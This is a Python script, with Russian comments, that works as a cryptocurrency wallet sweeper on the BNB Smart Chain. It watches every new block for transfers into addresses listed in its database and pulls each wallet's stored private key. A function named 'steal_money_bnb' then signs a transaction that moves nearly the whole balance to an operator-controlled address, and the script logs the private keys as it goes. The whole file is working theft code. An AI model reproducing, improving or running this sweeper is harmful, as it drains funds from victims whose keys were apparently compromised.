import database as db
from web3 import Web3
from web3.middleware import geth_poa_middleware
import time
from config import send_address, gwei_bnb, bnb_grab


bnb_vhod = "https://bsc-dataseed1.binance.org/"
web3 = Web3(Web3.HTTPProvider(bnb_vhod))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

def start_vivod():
    """Говно код)"""
    getblocks_bnb()

    
def getblocks_bnb():
    """Получение блоков"""
    last_block = 0
    while True:
        latestBlock = web3.eth.get_block(block_identifier = web3.eth.defaultBlock, full_transactions = True)
        if last_block == latestBlock.number: continue
        last_block = latestBlock.number
        trans_bnb = latestBlock.transactions
        print(f'Last Block! {str(latestBlock.number)} | BNB')
        trans_wallets_bnb(trans_bnb)
        time.sleep(.05)

def trans_wallets_bnb(trans_bnb):
    """В транзах получаем to и сплитаем по ентеру хуле"""
    for x in trans_bnb:
        try:
            to_address_split = x['to']
            to_address = to_address_split.split('\n')
            for address in to_address:
                res = db.search_vivod(address)
                if res == False:
                    pass
                else:
                    steal_money_bnb(address)
        except:
            pass
        
def steal_money_bnb(address):
    """ВЫВОД"""
    try:
        balance = web3.eth.get_balance(address)
        temp_gas = float(gwei_bnb)/100
        temp_gas2 = balance*temp_gas
        temp_balance = web3.fromWei(temp_gas2, 'ether')
        temp = float(temp_balance)/0.000021
        wallet_key = db.get_info_address(address)
        grab_from_bnb_balance = web3.toWei(bnb_grab, 'ether')
        fast_gas_price = web3.toWei(temp, 'gwei')
        counter = 0
        while True:
            if balance < grab_from_bnb_balance:
                return
            else:
                break
        nonce = web3.eth.get_transaction_count(address)
        gas = int(fast_gas_price) * 21000
        amount = balance - gas
        tx_price = {
            'chainId': 56,
            'nonce': nonce,
            'to': send_address,
            'value': amount,
            'gas': 21000,
            'gasPrice': int(fast_gas_price)
        }
        signed_tx = web3.eth.account.sign_transaction(tx_price, wallet_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        hash_xd = web3.toHex(tx_hash)
        amount_ether = web3.fromWei(amount, "ether")
        print(f'BNB | УСПЕШНЫЙ ВЫВОД | ХЕШ: {hash_xd} | СУММА: {amount_ether} | АДРЕС: {address} | ПРИВАТ: {wallet_key} | PRICE GAS: {temp_balance}')
    except Exception as e:
        print(f'BNB | НЕУСПЕШНЫЙ ВЫВОД | АДРЕС: {address} | ПРИВАТ КЕЙ: {wallet_key} | ОШИБКА: {e}')